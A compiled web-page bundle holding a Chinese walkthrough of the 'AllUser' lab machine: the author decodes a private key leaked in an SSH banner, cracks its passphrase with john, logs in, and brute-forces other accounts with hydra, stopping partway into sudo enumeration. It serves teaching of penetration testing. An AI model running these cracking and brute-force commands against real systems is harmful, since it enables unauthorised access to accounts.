(window.webpackJsonp=window.webpackJsonp||[]).push([[158],{522:function(s,a,t){"use strict";t.r(a);var n=t(11),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"存活主机扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#存活主机扫描"}},[s._v("#")]),s._v(" 存活主机扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth2 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.0/24\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183   08:00:27:a7:f8:de       PCS Systemtechnik GmbH\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("目标主机：192.168.6.183")]),s._v(" "),a("h2",{attrs:{id:"tcp-全端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#tcp-全端口扫描"}},[s._v("#")]),s._v(" TCP 全端口扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183                \n\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("仅开放 22 端口")]),s._v(" "),a("p",[s._v("UDP top 100 端口扫描，发现 68/udp（DHCP 客户端）开放")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sU")]),s._v(" --top-ports "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183\n\nPORT   STATE         SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("68")]),s._v("/udp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("filtered dhcpc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"ssh-服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-服务探测"}},[s._v("#")]),s._v(" ssh 服务探测")]),s._v(" "),a("p",[s._v("尝试ssh 登录 root 看看")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" root@192.168.6.183              \n** WARNING: connection is not using a post-quantum key exchange algorithm.\n** This session may be vulnerable to "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"store now, decrypt later"')]),s._v(" attacks.\n** The server may need to be upgraded. See https://openssh.com/pq.html\n6f70656e7373682d6b65792d7631000000000a6165733235362d63747200000006626372797074000000180000001028710c7b422cc65bdda5d950f01227030000001000000001000000330000000b7373682d6564323535313900000020f8f98e7aa6cf296464d4b3c7ca62f61471783237a4e2c8b7a245edf7b639a3ba00000090884782f7fb00e2d9c0895508e00708277582e3852370cc01aeb2b99cacde8cc9c2e3ed94fd6329038e15271090ee568e6059798be51fb9862473beaf44a16d01bbc6ad727ae203fb0c233efe2039d65203aaa85f5ea6e13cfce20c426cc3a6da077ea0750d3b0d487fd4cf30e194a64f13519dc0d442e779ad8fe5318c968cdecb4848a24bc4d1d08937e4c677ec8142\nroot@192.168.6.183's password: \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("SSH 返回的数据16进制数据进行转换字符串后以 openssh-key-v1 开头，符合 OpenSSH 私钥文件（v1）的格式")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/1.png",alt:""}})]),s._v(" "),a("p",[s._v("从结构中可以看到：")]),s._v(" "),a("ul",[a("li",[s._v("aes256-ctr：用于加密私钥数据；")]),s._v(" "),a("li",[s._v("bcrypt：作为 KDF（密钥派生函数），从口令派生出加密所用的密钥")])]),s._v(" "),a("p",[s._v("补充：")]),s._v(" "),a("p",[s._v("常见 SSH 私钥的格式主要有两种：")]),s._v(" "),a("ul",[a("li",[s._v("PEM 文本格式")])]),s._v(" "),a("p",[s._v("以 -----BEGIN RSA PRIVATE KEY-----、-----BEGIN PRIVATE KEY----- 等开头，中间是对 二进制结构 做 base64 编码后的数据。")]),s._v(" "),a("ul",[a("li",[s._v("OpenSSH 新格式（openssh-key-v1）")])]),s._v(" "),a("p",[s._v("OpenSSH 为支持多种算法自定义的一种私钥容器格式。内部是结构化二进制，以 openssh-key-v1 开头；")]),s._v(" "),a("p",[s._v("通常也会再做一层 base64，并加上 -----BEGIN OPENSSH PRIVATE KEY----- 头尾变成文本文件。")]),s._v(" "),a("p",[s._v("这次靶机返回的是 OpenSSH 新格式的“裸二进制内容” 的十六进制表示。我先把十六进制还原为二进制，再手动做 base64 和 BEGIN/END OPENSSH PRIVATE KEY 封装，让工具能够正常识别和处理。")]),s._v(" "),a("h2",{attrs:{id:"私钥转换"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#私钥转换"}},[s._v("#")]),s._v(" 私钥转换")]),s._v(" "),a("ol",[a("li",[a("p",[s._v("把十六进制字符串还原为原始二进制数据；")])]),s._v(" "),a("li",[a("p",[s._v("将这段二进制数据 base64 编码；")])]),s._v(" "),a("li",[a("p",[s._v("外面手动包上 -----BEGIN/END OPENSSH PRIVATE KEY-----，形成标准 PEM 封装格式。")])])]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" base64\n\nhex_str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"6f70656e7373682d6b65792d7631000000000a6165733235362d63747200000006626372797074000000180000001028710c7b422cc65bdda5d950f01227030000001000000001000000330000000b7373682d6564323535313900000020f8f98e7aa6cf296464d4b3c7ca62f61471783237a4e2c8b7a245edf7b639a3ba00000090884782f7fb00e2d9c0895508e00708277582e3852370cc01aeb2b99cacde8cc9c2e3ed94fd6329038e15271090ee568e6059798be51fb9862473beaf44a16d01bbc6ad727ae203fb0c233efe2039d65203aaa85f5ea6e13cfce20c426cc3a6da077ea0750d3b0d487fd4cf30e194a64f13519dc0d442e779ad8fe5318c968cdecb4848a24bc4d1d08937e4c677ec8142"')]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 将十六进制字符串转换为二进制数据")]),s._v("\ndata "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fromhex"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("hex_str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 将二进制数据转换为Base64")]),s._v("\nb64_data "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" base64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("b64encode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ascii'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 构建OpenSSH私钥文件内容")]),s._v("\nkey_file "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string-interpolation"}},[a("span",{pre:!0,attrs:{class:"token string"}},[s._v('f"-----BEGIN OPENSSH PRIVATE KEY-----\\n')]),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("b64_data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('\\n-----END OPENSSH PRIVATE KEY-----\\n"')])]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 保存到文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("with")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"id_rsa"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"w"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("as")]),s._v(" f"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    f"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("key_file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"私钥文件已保存为 id_rsa"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ python3 key.py\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("ssh2john 提取John爆破的哈希格式")]),s._v(" "),a("blockquote",[a("p",[s._v("ssh2john 这个工具的作用，就是解析私钥文件的结构，从中提取出用于密钥派生的关键信息：KDF 函数名 (bcrypt)、盐 (Salt)、迭代次数 (Iterations)")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("ssh2john id_rsa "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" id_rsa.hash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("blockquote",[a("p",[s._v("john 会用 bcrypt 函数，结合文件中提供的盐和迭代次数，对 字典 进行计算，生成一个候选的 AES Key，然后尝试用这个 Key 去解密私钥文件中加密的数据部分。")])]),s._v(" "),a("p",[s._v("爆破密码，爆破出密码是 0123456")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("john "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--wordlist")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/share/wordlists/rockyou.txt id_rsa.hash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/2.png",alt:""}})]),s._v(" "),a("p",[s._v("使用破解的密码，从私钥文件导出对应的公钥，发现公钥的注释里有用户名 sandu@AllUser")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ ssh-keygen "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-y")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" id_rsa\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj5jnqmzylkZNSzx8pi9hRxeDI3pOLIt6JF7fe2OaO6 sandu@AllUser\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("本地测试，生成过程会自带 username@hostname 注释")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/3.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"ssh-登录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-登录"}},[s._v("#")]),s._v(" ssh 登录")]),s._v(" "),a("p",[s._v("私钥连接 sandu 用户")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" id_rsa sandu@192.168.6.183\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("在连接过程输入私钥密码 0123456")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/4.png",alt:""}})]),s._v(" "),a("p",[s._v("或者使用 ssh-keygen 移除密码")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 将带密码的私钥转换为无密码私钥")]),s._v("\n┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ ssh-keygen "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" id_rsa\nEnter old passphrase: "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("输入原密码"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nKey has comment "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'sandu@AllUser'")]),s._v("\nEnter new passphrase "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("empty "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" no passphrase"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(": "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("直接回车"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("无密码"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nEnter same passphrase again: "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("直接回车"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nYour identification has been saved with the new passphrase.\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/5.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"意外收获"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#意外收获"}},[s._v("#")]),s._v(" 意外收获")]),s._v(" "),a("p",[s._v("家目录可以发现 AllUser")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sandu@AllUser:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v(" /home\ntotal 28K\ndrwxr-xr-x  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(" root      root      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 08:37 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v(" root      root      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Mar "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\ndrwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" damj      damj      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 08:37 damj\ndrwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" mj        mj        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 08:36 mj\ndrwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" oneoneone oneoneone "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 08:36 oneoneone\ndrwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" sandu     sandu     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 09:07 sandu\ndrwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" sublarge  sublarge  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 08:36 sublarge\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("hydra 可以爆破拿到 sandu 以外的用户密码")]),s._v(" "),a("p",[s._v("mj：123456")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/allUser"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ hydra "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" mj "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-P")]),s._v(" /usr/share/wordlists/rockyou.txt "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" host: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183   login: mj   password: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123456")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("sublarge：0123456")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ hydra "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" sublarge "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-P")]),s._v(" /usr/share/wordlists/rockyou.txt "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-V")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-t")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" host: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.183   login: sublarge   password: 0123456\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("damj 没爆出来")]),s._v(" "),a("p",[s._v("oneoneone 猜出来了密码是：oneoneone")]),s._v(" "),a("h2",{attrs:{id:"sudo-权限枚举"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sudo-权限枚举"}},[s._v("#")]),s._v(" sudo 权限枚举")]),s._v(" "),a("p",[s._v("回到 sandu 用户，查看 sudo 